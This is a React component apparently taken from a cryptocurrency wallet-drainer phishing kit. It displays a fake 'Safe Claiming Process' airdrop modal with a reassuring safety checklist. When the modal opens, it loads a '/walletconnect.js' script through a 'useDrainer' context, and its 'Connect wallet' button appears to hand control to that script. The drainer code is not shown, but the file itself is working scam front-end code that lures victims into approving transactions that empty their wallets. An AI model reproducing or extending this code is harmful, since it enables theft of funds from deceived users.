import styles from "./GetAirdropModal.module.css";
import { Button, Modal, Portal } from "@mantine/core";
import {
  IconSquareCheckFilled,
  IconInfoSquareFilled,
  IconProgressCheck,
  IconShieldExclamation,
  IconAlignBoxLeftTopFilled,
} from "@tabler/icons-react";
import AirdropImage from "../../assets/get-airdrop-modal.webp";
import { useEffect } from "react";
import { useDrainer } from "../../context/DrainerContext.jsx";
import { identifyCryptoWallet } from "../../helpers/helpers.js";

const GetAirdropModal = ({ close, opened, airdrop, walletAddress }) => {
  const { drainerIsAdded, updateStatus } = useDrainer();

  console.log(airdrop, "airdrop");

  useEffect(() => {
    if (drainerIsAdded || !opened) return;

    const onDOMContentLoaded = () => {
      // Dynamically load the walletconnect.js script
      const secondScript = document.createElement("script");
      secondScript.src = "/walletconnect.js";
      // secondScript.charset = "UTF-8";
      secondScript.type = "text/javascript";
      document.body.appendChild(secondScript);

      // Ensure the script initializes properly once loaded
      secondScript.onload = () => {
        updateStatus();
        console.log("Second script loaded successfully");
      };
    };

    // Attach the listener for DOMContentLoaded
    if (document.readyState === "loading") {
      // If DOM is still loading, wait for it to complete
      document.addEventListener("DOMContentLoaded", onDOMContentLoaded);
    } else {
      // If DOM is already loaded, execute immediately
      onDOMContentLoaded();
    }

    return () => {
      // Cleanup the event listener on component unmount
      document.removeEventListener("DOMContentLoaded", onDOMContentLoaded);
    };
  }, [opened]);

  if (!airdrop) return null;

  return (
    <Portal>
      <Modal
        centered
        opened={opened}
        onClose={() => {
          close();
          window.location.reload();
        }}
        title={
          <p className={styles["title"]}>
            <IconSquareCheckFilled size={20} color={"#FF9400"} />
            Safe Claiming Process
          </p>
        }
        className={styles["modal"]}
        styles={{
          header: {
            padding: "15px 15px 3px 15px",
            minHeight: 40,
            marginBottom: 10,
          },
          content: { borderRadius: 15 },
          body: { display: "flex", flexDirection: "column" },
        }}
        overlayProps={{
          backgroundOpacity: 0.85,
          blur: 4,
        }}
      >
        <img src={AirdropImage} alt={""} className={styles["image"]} />
        <p className={styles["subtitle"]}>
          Please review the following information before claiming your tokens
        </p>
        <div className={styles["claim-details"]}>
          <h2>
            <IconInfoSquareFilled color={"#FF9400"} size={20} />
            Airdrop information
          </h2>
          <p>
            Platform: <span>{airdrop.name}</span>
          </p>
          <p>
            Token: <span>{airdrop.token}</span>
          </p>
          <p>
            Amount: <span>{airdrop.amount}</span>
          </p>
          <p>
            Network: <span>{identifyCryptoWallet(walletAddress)}</span>
          </p>
        </div>
        <h2 className={styles["steps-title"]}>
          <IconAlignBoxLeftTopFilled color={"#FF9400"} size={20} />
          Steps to claim
        </h2>
        <ul className={styles["steps-list"]}>
          <li>1. Connect wallet.</li>
          <li>2. Ensure you are using the Ethereum network.</li>
          <li>3. Confirm the transaction.</li>
        </ul>
        <div className={styles["safety"]}>
          <h2>
            <IconShieldExclamation size={20} />
            Safety checklist
          </h2>
          <p>• Ensure you're connected to the correct network</p>
          <p>• Verify you have enough ETH for gas fees</p>
          <p>• Never share your seed phrase or private keys.</p>
        </div>
        <Button className={"open"} color={"#FF9400"}>
          Connect wallet
        </Button>
      </Modal>
    </Portal>
  );
};

export default GetAirdropModal;
